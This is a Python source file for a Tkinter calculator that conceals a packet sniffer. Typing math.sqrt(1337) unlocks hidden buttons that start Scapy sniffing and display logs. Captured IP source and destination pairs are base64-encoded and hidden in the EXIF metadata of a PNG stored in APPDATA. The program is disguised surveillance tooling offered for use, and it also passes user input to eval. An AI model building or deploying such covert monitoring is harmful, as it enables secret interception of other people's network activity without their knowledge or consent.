import tkinter as tk
from scapy.all import sniff, IP
import threading
import base64
import os
import math
from PIL import Image
import piexif
import sys

# GUI Calculator with Hidden Packet Sniffer
class SecretCalculator:
    def __init__(self, master):
        self.master = master
        master.title("Calculator")

        self.entry = tk.Entry(master, width=40, borderwidth=5)
        self.entry.grid(row=0, column=0, columnspan=4)

        self.create_buttons()
        
        # Secret UI initially hidden
        self.secret_ui_visible = False
        
        # Sniffing toggle
        self.sniffing_enabled = False
        
        # Determine base path for accessing files (for .exe compatibility)
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS  # PyInstaller's temp folder
        else:
            base_path = os.getcwd()
        
        # Ensure the image is stored in a persistent location
        self.image_path = os.path.join(os.getenv("APPDATA"), "hidden_logs.png")
        
        # Create the image if it does not exist
        if not os.path.exists(self.image_path):
            img = Image.new("RGB", (100, 100), color=(255, 255, 255))
            
            # Ensure EXIF data exists from the start
            exif_dict = {"0th": {piexif.ImageIFD.ImageDescription: "Hidden Logs Initialized".encode("utf-8")}}
            exif_bytes = piexif.dump(exif_dict)
            
            img.save(self.image_path, exif=exif_bytes)
        
        # Start sniffer in a separate thread but only if enabled
        self.sniffing_thread = threading.Thread(target=self.start_sniffer, daemon=True)
        self.sniffing_thread.start()

    def create_buttons(self):
        buttons = [
            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
            ('0', 4, 0), ('.', 4, 1), ('=', 4, 2), ('+', 4, 3),
            ('sqrt', 5, 2)
        ]
        
        for (text, row, col) in buttons:
            button = tk.Button(self.master, text=text, width=10, height=3,
                               command=lambda t=text: self.on_button_click(t))
            button.grid(row=row, column=col)
        
        clear_button = tk.Button(self.master, text='C', width=10, height=3, command=self.clear_entry)
        clear_button.grid(row=5, column=0, columnspan=2)
        
        # Secret Buttons - Initially Hidden
        self.secret_button = tk.Button(self.master, text="View Logs", width=20, height=2, command=self.show_logs)
        self.secret_button.grid(row=6, column=0, columnspan=4)
        self.secret_button.grid_remove()
        
        self.sniff_toggle_button = tk.Button(self.master, text="Enable Sniffing", width=20, height=2, command=self.toggle_sniffing)
        self.sniff_toggle_button.grid(row=7, column=0, columnspan=4)
        self.sniff_toggle_button.grid_remove()
    
    def on_button_click(self, char):
        if char == '=':
            try:
                expression = self.entry.get()
                result = eval(expression)
                
                # Check if the user manually entered sqrt(1337)
                if expression.strip() == "math.sqrt(1337)":
                    self.unlock_secret_ui()
                
                self.entry.delete(0, tk.END)
                self.entry.insert(tk.END, str(result))
            except:
                self.entry.delete(0, tk.END)
                self.entry.insert(tk.END, "Error")
        elif char == 'sqrt':
            current_text = self.entry.get()
            self.entry.delete(0, tk.END)
            self.entry.insert(tk.END, f"math.sqrt({current_text})")
        else:
            self.entry.insert(tk.END, char)
    
    def clear_entry(self):
        self.entry.delete(0, tk.END)
    
    def unlock_secret_ui(self):
        if not self.secret_ui_visible:
            self.secret_ui_visible = True
            self.secret_button.grid()
            self.sniff_toggle_button.grid()
    
    def show_logs(self):
        img = Image.open(self.image_path)
        exif_data = piexif.load(img.info["exif"]) if "exif" in img.info else {"0th": {}}
        hidden_logs = exif_data["0th"].get(piexif.ImageIFD.ImageDescription, b"").decode("utf-8")
        self.show_popup("Captured Logs", hidden_logs if hidden_logs else "No logs found.")
    
    def show_popup(self, title, message):
        popup = tk.Toplevel(self.master)
        popup.title(title)
        label = tk.Label(popup, text=message, padx=10, pady=10)
        label.pack()
        close_button = tk.Button(popup, text="Close", command=popup.destroy)
        close_button.pack()
    
    def toggle_sniffing(self):
        self.sniffing_enabled = not self.sniffing_enabled
        self.sniff_toggle_button.config(text="Disable Sniffing" if self.sniffing_enabled else "Enable Sniffing")
    
    def start_sniffer(self):
        while True:
            if self.sniffing_enabled:
                sniff(prn=self.process_packet, store=False)
    
    def process_packet(self, packet):
        if packet.haslayer(IP):
            encrypted_data = base64.b64encode(f"{packet[IP].src} -> {packet[IP].dst}".encode()).decode()
            self.embed_logs_in_image(encrypted_data)
    
    def embed_logs_in_image(self, data):
        img = Image.open(self.image_path)
        exif_data = piexif.load(img.info["exif"]) if "exif" in img.info else {"0th": {}}
        existing_logs = exif_data["0th"].get(piexif.ImageIFD.ImageDescription, b"").decode("utf-8")
        
        new_logs = existing_logs + "\n" + data if existing_logs else data
        exif_data["0th"][piexif.ImageIFD.ImageDescription] = new_logs.encode("utf-8")
        
        exif_bytes = piexif.dump(exif_data)
        img.save(self.image_path, exif=exif_bytes)
        
if __name__ == "__main__":
    root = tk.Tk()
    app = SecretCalculator(root)
    root.mainloop()
